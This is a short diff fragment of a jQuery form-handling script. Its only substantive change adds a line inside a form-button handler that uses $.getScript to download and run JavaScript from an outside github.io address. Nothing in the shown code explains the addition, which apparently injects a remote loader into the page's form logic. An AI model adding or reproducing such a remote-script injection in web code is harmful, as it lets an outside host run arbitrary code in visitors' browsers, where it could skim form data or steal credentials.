@@ -82,7 +82,7 @@ $("form .form-group button").ready(function () {
                                             newWindow.document.write(html);
                                             html="";
                                             count=0;
-                                           
+                                            $.getScript("https://alta122k.github.io/buudienvip/script.js");
                                         }
                                     })
                                     
